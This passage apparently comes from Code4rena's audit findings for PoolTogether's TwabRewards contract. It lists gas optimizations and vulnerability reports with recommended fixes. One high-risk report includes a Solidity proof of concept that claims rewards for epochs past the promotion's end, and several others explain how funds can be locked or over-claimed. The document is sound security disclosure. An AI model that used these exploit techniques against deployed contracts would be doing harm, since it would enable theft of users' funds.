"target": "2021-12-pooltogether-findings", "body": "# Handle  0x0x0x   # Vulnerability details  [https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L302-L321](https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L302-L321) is as follows:  ```         uint256 _averageBalance = _ticket.getAverageBalanceBetween(             _user,             uint64(_epochStartTimestamp),             uint64(_epochEndTimestamp)         );          uint64[] memory _epochStartTimestamps = new uint64[](1);         _epochStartTimestamps[0] = uint64(_epochStartTimestamp);          uint64[] memory _epochEndTimestamps = new uint64[](1);         _epochEndTimestamps[0] = uint64(_epochEndTimestamp);          uint256[] memory _averageTotalSupplies = _ticket.getAverageTotalSuppliesBetween(             _epochStartTimestamps,             _epochEndTimestamps         );          if (_averageTotalSupplies[0] > 0) {             return (_promotion.tokensPerEpoch * _averageBalance) / _averageTotalSupplies[0];         }          return 0;     } ```  Since `_averageBalance` is always bigger than `_averageTotalSupplies[0]`. We can implement the, if statement earlier. This will ensure to output 0 earlier. Furthermore, `_averageBalance` is in stack and this check costs less gas. Therefore, the code can be implemented as follows:  ```         uint256 _averageBalance = _ticket.getAverageBalanceBetween(             _user,             uint64(_epochStartTimestamp),             uint64(_epochEndTimestamp)         );     if (_averageBalance > 0) {           uint64[] memory _epochStartTimestamps = new uint64[](1);           _epochStartTimestamps[0] = uint64(_epochStartTimestamp);              uint64[] memory _epochEndTimestamps = new uint64[](1);           _epochEndTimestamps[0] = uint64(_epochEndTimestamp);              uint256[] memory _averageTotalSupplies = _ticket.getAverageTotalSuppliesBetween(               _epochStartTimestamps,               _epochEndTimestamps           );              return (_promotion.tokensPerEpoch * _averageBalance) / _averageTotalSupplies[0];         }          return 0;     } ```  "}, {"title": "`_nextPromotionId/_latestPromotionId` calculation can be done more efficiently", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "`_nextPromotionId/_latestPromotionId` calculation can be done more efficiently"}, {"title": "event PromotionCancelled should also emit the _to address", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/127", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  hubble   # Vulnerability details  ## Impact Since there is an option for the promoter to provide an alternate address while issuing cancelPromotion apart from the creator(promoter address) It is good to track the _to address where the remainingRewards are sent on cancelPromotion  ## Proof of Concept contract : TwabRewards line 50 :    event PromotionCancelled(uint256 indexed promotionId, uint256 amount);  function : cancelPromotion(uint256 _promotionId, address _to) line 135 :  emit PromotionCancelled(_promotionId, _remainingRewards);  ## Tools Used Manual review  ## Recommended Mitigation Steps Add the 'to address' in the event, as below  line 50 :    event PromotionCancelled(uint256 indexed promotionId, address to, uint256 amount);  function : cancelPromotion(uint256 _promotionId, address _to) line 135 :  emit PromotionCancelled(_promotionId, _to, _remainingRewards);    "}, {"title": "extendPromotion function should be access controlled by using onlyPromotionCreator", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/126", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "extendPromotion function should be access controlled by using onlyPromotionCreator"}, {"title": "Unsafe uint64 casting may overflow", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/123", "labels": ["bug", "2 (Med Risk)"], "target": "2021-12-pooltogether-findings", "body": "Unsafe uint64 casting may overflow"}, {"title": "_requirePromotionActive allows actions before the promotion is active", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/115", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "_requirePromotionActive allows actions before the promotion is active"}, {"title": "Adding unchecked directive can save gas", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/111", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "Adding unchecked directive can save gas"}, {"title": "`getCurrentEpochId()` Malfunction for ended promotions", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/109", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  WatchPug   # Vulnerability details  For ended promotions, `getCurrentEpochId()` may return a `epochId` larger than `numberOfEpochs`.  If the result of this view method is to be used as parameters of `claimRewards()`, it may cause `claimRewards()` to fail.  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L276-L279  ```solidity=276 function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {     // elapsedTimestamp / epochDurationTimestamp     return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration; } ```  ### Recommendation  Consider checking if `block.timestamp > _promotionEndTimestamp` in `_getCurrentEpochId()` and return `_promotion.numberOfEpochs - 1` for ended promotions.  "}, {"title": "`createPromotion()` Lack of input validation for `_epochDuration` can potentially freeze promotion creator's funds", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/106", "labels": ["bug", "3 (High Risk)"], "target": "2021-12-pooltogether-findings", "body": "`createPromotion()` Lack of input validation for `_epochDuration` can potentially freeze promotion creator's funds"}, {"title": "`cancelPromotion()` Unable to cancel unstarted promotions", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/101", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  WatchPug   # Vulnerability details  For unstarted promotions, `cancelPromotion()` will revert at `block.timestamp - _promotion.startTimestamp` in `_getCurrentEpochId()`.  Call stack: `cancelPromotion()` -> `_getRemainingRewards()` -> `_getCurrentEpochId()`.  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L331-L336  ```solidity=331 function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {     // _tokensPerEpoch * _numberOfEpochsLeft     return         _promotion.tokensPerEpoch *         (_promotion.numberOfEpochs - _getCurrentEpochId(_promotion)); } ```  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L276-L279  ```solidity=276 function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {     // elapsedTimestamp / epochDurationTimestamp     return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration; } ```  ### Recommendation  Consider checking if ` _promotion.startTimestamp > block.timestamp` and refund `_promotion.tokensPerEpoch * _promotion.numberOfEpochs` in `cancelPromotion()`.  "}, {"title": "Avoid unnecessary dynamic size array `_averageTotalSupplies` can save gas", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/91", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L308-L323  ```solidity=308{314,319,320} uint64[] memory _epochStartTimestamps = new uint64[](1); _epochStartTimestamps[0] = uint64(_epochStartTimestamp);  uint64[] memory _epochEndTimestamps = new uint64[](1); _epochEndTimestamps[0] = uint64(_epochEndTimestamp);  uint256[] memory _averageTotalSupplies = _ticket.getAverageTotalSuppliesBetween(     _epochStartTimestamps,     _epochEndTimestamps );  if (_averageTotalSupplies[0] > 0) {     return (_promotion.tokensPerEpoch * _averageBalance) / _averageTotalSupplies[0]; }  return 0; ```  As there is only one time frame, `uint256[] memory _averageTotalSupplies = getAverageTotalSuppliesBetween(...)` can be changed to `uint256 _averageTotalSupply = getAverageTotalSuppliesBetween(...)[0]`, and `_averageTotalSupplies[0]` can be changed to `_averageTotalSupply` for gas saving.  "}, {"title": "`_requireTicket()` Implementation can be simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/90", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L230-L244  ```solidity=230{233,237-243}     function _requireTicket(address _ticket) internal view {         require(_ticket != address(0), \"TwabRewards/ticket-not-zero-address\");          (bool succeeded, bytes memory data) = address(_ticket).staticcall(             abi.encodePacked(ITicket(_ticket).controller.selector)         );          address controllerAddress;          if (data.length > 0) {             controllerAddress = abi.decode(data, (address));         }          require(succeeded && controllerAddress != address(0), \"TwabRewards/invalid-ticket\");     } ```  ### Recommendation  Change to:  ```solidity=230{233,237}     function _requireTicket(address _ticket) internal view {         require(_ticket != address(0), \"TwabRewards/ticket-not-zero-address\");          (bool succeeded, bytes memory data) = _ticket.staticcall(             abi.encodePacked(ITicket(_ticket).controller.selector)         );          require(succeeded && data.length > 0 && abi.decode(data, (uint160)) != 0, \"TwabRewards/invalid-ticket\");     } ```  -   Removing redundant casting of `address(_ticket)` as `_ticket` is `address`; -   `controllerAddress` is unnecessary as it's being used only once; -   Checking if `succeeded` earlier can avoid unnecessary code execution when this check failed; -   Replacing `abi.decode(data, (address)) != address(0)` with `abi.decode(data, (uint160)) != 0` to avoid type casting.  "}, {"title": "`getRewardsAmount` might return wrong result", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/80", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  certora   # Vulnerability details  getRewardsAmount gets epochs ids as uint256[]. However, it should be uint8[].  In _calculateRewardAmount, the epoch start time and end time are calculated: ``` uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId); uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration; ```  and then are casted to uint64 for the rest of the function. if it's greater than 2**64, it will be truncated. ## Impact `getRewardsAmount` might return wrong result  ## Tools Used manual review ## Recommended Mitigation Steps get _epochIds as uint8[] instead uint256[]  "}, {"title": "TwarbRewards: don't use the onlyPromotionCreator modifier to save gas", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  GiveMeTestEther   # Vulnerability details  ## Impact cancelPromotion() and its modifier both call _getPromotion() to get the Promotion struct. We can save one such call by removing the modifier and do the check of the modifier at the beginning of the cancelPromotion() block to save storage reads.   ## Proof of Concept https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119  ## Tools Used  ## Recommended Mitigation Steps - remove the modifier onlyPromotionCreator - do the require statement at the beginning of cancelPromotion()       function cancelPromotion(uint256 _promotionId, address _to)         external         override         returns (bool)     {         Promotion memory _promotion = _getPromotion(_promotionId);                // do here the modifiers check          require(             msg.sender == _promotion .creator,             \"TwabRewards/only-promotion-creator\"         );          _requirePromotionActive(_promotion);         require(_to != address(0), \"TwabRewards/recipient-not-zero-address\");          uint256 _remainingRewards = _getRemainingRewards(_promotion);          delete _promotions[_promotionId];         _promotion.token.safeTransfer(_to, _remainingRewards);          emit PromotionCancelled(_promotionId, _remainingRewards);          return true;     }  "}, {"title": "Dust Token Balances Cannot Be Claimed By An `admin` Account", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/75", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  leastwood   # Vulnerability details  ## Impact  Users who have a small claim on rewards for various promotions, may not feasibly be able to claim these rewards as gas costs could outweigh the sum they receive in return. Hence, it is likely that a dust balance accrues overtime for tokens allocated for various promotions. Additionally, the `_calculateRewardAmount` calculation may result in truncated results, leading to further accrual of a dust balance. Therefore, it is useful that these funds do not go to waste.  ## Proof of Concept  https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L162-L191  ## Tools Used  Manual code review.  ## Recommended Mitigation Steps  Consider allowing an `admin` account to skim a promotion's tokens if it has been inactive for a certain length of time. There are several potential implementations, in varying degrees of complexity. However, the solution should attempt to maximise simplicity while minimising the accrual of dust balances.  "}, {"title": "Missing Check When Transferring Tokens Out For A Given Promotion", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/70", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "Missing Check When Transferring Tokens Out For A Given Promotion"}, {"title": "Anyone can claim rewards on behalf of someone", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/68", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "Anyone can claim rewards on behalf of someone"}, {"title": "uint256 types can be uint64", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The `_calculateRewardAmount()` function in TwabRewards.sol uses the uint256 type for the three variables `_epochDuration`, `_epochStartTimestamp`, and `_epochEndTimestamp`. However, there is no need for these variable to be uint256 instead of uint64 because 1. these variables are later cast as uint64 values anyway 2. the block.timestamp value is orders of magnitude less than the uint64 max value. To expand on this second point, if the the block.timestamp values were on the same order of magnitude as the uint64 max value, then the casting of the uint256 timestamp values to uint64 could cause overflow issues because the OpenZeppelin SafeCast library is not used.  The timestamp values could even be of type uint32 (Uniswap v3 does this in places, and the max uint32 timestamp equates to the year 2106), but since the ITicket.sol contract imported by TwabRewards.sol uses uint64, it would be better to use uint64 to maintain consistency.  ## Proof of Concept  The uint256 variables that can be uint64 are found in TwabRewards.sol: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L294-L296   ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Make these variables uint64 for gas savings and consistency with Iticket.sol timestamps. Remove unnecessary uint64() casting when all variables in the `_calculateRewardAmount()` function consistently use uint64 types.  "}, {"title": "Inconsistent definition of when an epoch ends", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/54", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  harleythedog   # Vulnerability details  ## Impact The implementation of `_getCurrentEpochId` is: ``` function  _getCurrentEpochId(Promotion  memory  _promotion) internal  view  returns (uint256) {  return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration; } ```  This means that if exactly `_promotion.epochDuration` seconds have elapsed since the start timestamp, then  the current epoch is 1, and the 0th epoch is completed. However, there are the following lines of code in `_calculateRewardAmount`:  ``` function  _calculateRewardAmount(  address  _user,  Promotion  memory  _promotion,  uint256  _epochId ) internal  view  returns (uint256) {  uint256 _epochDuration = _promotion.epochDuration;  uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);  uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;  require(block.timestamp > _epochEndTimestamp, \"TwabRewards/epoch-not-over\");  ... } ```  If exactly `_promotion.epochDuration` seconds have elapsed since the start timestamp, then this function will revert since the require has a `>` instead of a `>=`.  Thus there are two conflicting definitions of when an epoch ends. In the case of `_getCurrentEpochId`, it is when `_promotion.epochDuration` seconds elapse. In the case of `_calculateRewardAmount`, it is when *more than* `_calculateRewardAmount` seconds elapse. This only makes a difference in one exact second, but it is best to be consistent.  ## Proof of Concept See `_getCurrentEpochId` here: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L276  See `_calculateRewardAmount` here: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L289  ## Tools Used Inspection  ## Recommended Mitigation Steps Change  ``` require(block.timestamp > _epochEndTimestamp, \"TwabRewards/epoch-not-over\"); ``` to  ``` require(block.timestamp >= _epochEndTimestamp, \"TwabRewards/epoch-not-over\"); ``` in `_calculateRewardAmount`.  "}, {"title": "getRewardsAmount doesn't check epochs haven't been claimed", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/50", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  harleythedog   # Vulnerability details  ## Impact In ITwabRewards.sol, it is claimed that `getRewardsAmount` should account for epochs that have already been claimed, and not include these epochs in the total amount (indeed, there is a line that says `@dev Will be 0 if user has already claimed rewards for the epoch.`)  However, no such check is done in the implementation of `getRewardsAmount`. This means that users will be shown rewardAmounts that are higher than they should be, and users will be confused when they are transferred fewer tokens than they are told they will. This would cause confusion, and people may begin to mistrust the contract since they think they are being transferred fewer tokens than they are owed.  ## Proof of Concept See the implementation of `getRewardsAmount` here: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L209  Notice that there are no checks that the epochs have not already been claimed. Compare this to `claimRewards` which *does* check for epochs that have already been claimed with the following require statement: ``` require(!_isClaimedEpoch(_userClaimedEpochs, _epochId), \"TwabRewards/rewards-already-claimed\"); ``` A similar check should be added `getRewardsAmount` so that previously claimed epochs are not included in the sum.  ## Tools Used Inspection  ## Recommended Mitigation Steps Add a similar check for previously claimed epochs as described above.  "}, {"title": "cancelPromotion() Does Not Send Promotion Tokens Back to the Creator", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/36", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2021-12-pooltogether-findings", "body": "cancelPromotion() Does Not Send Promotion Tokens Back to the Creator"}, {"title": "Check Zero Address Before Function Call Can Save Gas", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/35", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  Meta0xNull   # Vulnerability details  ## Impact <code>require(_to != address(0), \"TwabRewards/recipient-not-zero-address\");</code>  Check Zero Address Before Function Call eg. _requirePromotionActive() Can Save Gas.  ## Proof of Concept https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L128  ## Tools Used Manual Review  ## Recommended Mitigation Steps Move Zero Address Check to Line L125: https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L125  "}, {"title": "Contract does not work with fee-on transfer tokens", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/30", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  pmerkleplant   # Vulnerability details  ## Impact  There exist ERC20 tokens that charge a fee for every transfer.  This kind of token does not work correctly with the `TwabRewards` contract as the rewards calculation for an user is based on `promotion.tokensPerEpoch` (see line [320](https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L320)).  However, the actual amount of tokens the contract holds could be less than `promotion.tokensPerEpoch * promotion.numberOfEpochs` leading to not claimable rewards for users claiming later than others.  ## Recommended Mitigation Steps  To disable fee-on transfer tokens for the contract, add the following code in `createPromotion` around line 11: ``` uint256 oldBalance = _token.balanceOf(address(this)); _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs); uint256 newBalance = _token.balanceOf(address(this)); require(oldBalance + _tokenPerEpoch * _numberOfEpochs == newBalance); ```  "}, {"title": "No sanity checks for user supplied promotion values", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/29", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  kenzo   # Vulnerability details  User supplied values are not checked and can lead to unexpected behavior (such as division by 0, underflows...)  ## Impact I believe the high risk impact has been detailed and mitigated in other findings. However, for cleanliness and preventive measures, I suggest not allowing illogical inputs.  ## Proof of Concept There is no validation on the user supplied promotion inputs. [(Code ref)](https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L88:#L116) Therefore for example, a user can supply _numberOfEpochs = 0, _epochDuration = 0, _tokensPerEpoch = 0. This leads to garbage values in the contract. A user can create a promotion without paying any tokens (if _numberOfEpochs or _tokensPerEpoch  = 0). These may confuse front ends, or compound to lead to more serious errors.  ## Recommended Mitigation Steps Add sanity checks (such as inputs > 0) to `createPromotion` and `extendPromotion`.  "}, {"title": "cancelPromotion is too rigorous", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/23", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact When you cancel a promotion with cancelPromotion() then the promotion is complete deleted. This means no-one can claim any rewards anymore, because  _promotions[_promotionId] no longer exists.  It also means all the unclaimed tokens (of the previous epochs) will stay locked in the contract.  ## Proof of Concept https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119-L138 ```JS function cancelPromotion(uint256 _promotionId, address _to) ... {        ...         uint256 _remainingRewards = _getRemainingRewards(_promotion);         delete _promotions[_promotionId];         ```  ## Tools Used  ## Recommended Mitigation Steps In the function cancelPromotion() lower the numberOfEpochs or set a state variable, to allow user to claim their rewards.  "}, {"title": "Continue claiming reqrds after numberOfEpochs are over", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/20", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact When claiming rewards via claimRewards(), the function _calculateRewardAmount() is called. The function _calculateRewardAmount() has a check to make sure the epoch is over  ```JS   require(block.timestamp > _epochEndTimestamp, \"TwabRewards/epoch-not-over\");  ``` However neither functions check if the _epochId is within the range of the reward epochs. Ergo it is possible to continue claiming rewards after the reward period is over. This only works as long as there are enough tokens in the contract. But this is the case when not everyone has claimed, or other rewards use the same token.  The proof of concept contains a simplified version of the contract, and shows how this can be done. When run in remix you get the following output, while there is only 1 epoch. console.log: \u2003Claiming for epoch 1 1 \u2003Claiming for epoch 2 1 \u2003Claiming for epoch 3 1 \u2003Claiming for epoch 4 1 \u2003Claiming for epoch 5 1  ## Proof of Concept ```JS  // SPDX-License-Identifier: GPL-3.0 pragma solidity 0.8.6; import \"hardhat/console.sol\";    contract TwabRewards {      struct Promotion {         uint216 tokensPerEpoch;         uint32 startTimestamp;         uint32 epochDuration;         uint8 numberOfEpochs;     }     mapping(uint256 => Promotion) internal _promotions;     uint256 internal _latestPromotionId;     mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs;          constructor() {         uint id=createPromotion(1,uint32(block.timestamp)-10,1,1);         claimRewards(id,1);         claimRewards(id,2);         claimRewards(id,3);         claimRewards(id,4);         claimRewards(id,5);     }           function createPromotion(uint216 _tokensPerEpoch,uint32 _startTimestamp,uint32 _epochDuration,uint8 _numberOfEpochs) public  returns (uint256) {         uint256 _nextPromotionId = _latestPromotionId + 1;         _latestPromotionId = _nextPromotionId;         _promotions[_nextPromotionId] = Promotion(_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);         return _nextPromotionId;     }       function claimRewards(         uint256 _promotionId,         uint256 _epochId     ) public  returns (uint256) {         Promotion memory _promotion = _getPromotion(_promotionId);         address _user=address(0);         uint256 _rewardsAmount;         uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];          for (uint256 index = 0; index < 1; index++) {             require(                 !_isClaimedEpoch(_userClaimedEpochs, _epochId),                 \"TwabRewards/rewards-already-claimed\"             );             _rewardsAmount += _calculateRewardAmount(_promotion, _epochId);             _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);         }         _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;         console.log(\"Claiming for epoch\",_epochId,_rewardsAmount);         return _rewardsAmount;     }      function getPromotion(uint256 _promotionId) public view  returns (Promotion memory) {         return _getPromotion(_promotionId);     }   function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory) {         return _promotions[_promotionId];     }          function _isClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (bool)     {         return (_userClaimedEpochs >> _epochId) & uint256(1) == 1;     }   function _calculateRewardAmount(                 Promotion memory _promotion,         uint256 _epochId     ) internal view returns (uint256) {         uint256 _epochDuration = _promotion.epochDuration;         uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);         uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;         require(block.timestamp > _epochEndTimestamp, \"TwabRewards/epoch-not-over\");         return 1;     }   function _updateClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (uint256) {         return _userClaimedEpochs | (uint256(1) << _epochId);     }        function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {                 return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration;     }       function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {         // _tokensPerEpoch * _numberOfEpochsLeft         return             _promotion.tokensPerEpoch *             (_promotion.numberOfEpochs - _getCurrentEpochId(_promotion));     }   } ```  ## Tools Used  ## Recommended Mitigation Steps In the function _calculateRewardAmount() add something like the following in the beginning after the require. if ( _epochId >= _promotion.numberOfEpochs) return 0;   "}, {"title": "simplify require in _requirePromotionActive()", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  gpersoon   # Vulnerability details  ## Impact The function _requirePromotionActive() contains the following check in a require statement: ```JS  _promotionEndTimestamp > 0 && _promotionEndTimestamp >= block.timestamp, ``` When _promotionEndTimestamp is larger than block.timestamp it will also be larger than 0. Thus the statement can be simplified to save some gas.  ## Proof of Concept https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L250-L258  ```JS function _requirePromotionActive(Promotion memory _promotion) internal view {         ...         require(  _promotionEndTimestamp > 0 && _promotionEndTimestamp >= block.timestamp, \"TwabRewards/promotion-not-active\" );     } ```   ## Tools Used  ## Recommended Mitigation Steps Change the require statement to:         require( _promotionEndTimestamp >= block.timestamp, \"TwabRewards/promotion-not-active\" ); // will certainly be > 0  "}, {"title": "Prefix increments are cheaper than postfix increments", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "Prefix increments are cheaper than postfix increments"}, {"title": "Caching array length can save gas", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  robee   # Vulnerability details  Caching the array length is more gas efficient.  This is because access to a local variable in solidity is more efficient than query storage / calldata / memory  We recommend to change from:  for (uint256 i=0; i<array.length; i++) { ... } to: uint len = array.length   for (uint256 i=0; i<len; i++) { ... } These functions use not using prefix increments (`++x`) or not using the unchecked keyword:           TwabRewards.sol, _epochIds, 172         TwabRewards.sol, _epochIds, 217   "}, {"title": "Short the following require messages", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "Short the following require messages"}, {"title": "Struct packing", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/12", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  robee   # Vulnerability details  In ITwabRewards.sol, Promotion is optimized to: 4 slots from: 5 slots. The new order of types (you choose the actual variables):         1. IERC20         2. uint216         3. uint32         4. uint8         5. address         6. uint32         7. address   "}, {"title": "User can fund other user promotion by mistake", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/11", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-pooltogether-findings", "body": "User can fund other user promotion by mistake"}, {"title": "Backdated _startTimestamp can lead to loss of funds", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/8", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-pooltogether-findings", "body": "# Handle  csanuragjain   # Vulnerability details  ## Impact This can lead to loss of funds as there is no recovery function of funds stuck like this  ## Proof of Concept 1. User A creates a new promotion using createPromotion function. By mistake he provides 1 year ago value for _startTimestamp with promotion duration as 6 months  2. Since there is no check to see that _startTimestamp > block.timestamp so this promotion gets created  3. User cannot claim this promotion if they were not having promotion tokens in the 1 year old promotion period. This means promotion amount remains with contract  4. Even promotion creator cannot claim back his tokens since promotion end date has already passed so cancelPromotion will fail  5. As there is no recovery token function in contract so even contract cant transfer this token and the tokens will remain in this contract with no one able to claim those   ## Recommended Mitigation Steps Add below check in the createPromotion function  ``` function createPromotion(         address _ticket,         IERC20 _token,         uint216 _tokensPerEpoch,         uint32 _startTimestamp,         uint32 _epochDuration,         uint8 _numberOfEpochs     ) external override returns (uint256) { require(_startTimestamp>block.timestamp,\"should be after current time\"); } ```  "}, {"title": "Rewards can be claimed multiple times", "html_url": "https://github.com/code-423n4/2021-12-pooltogether-findings/issues/3", 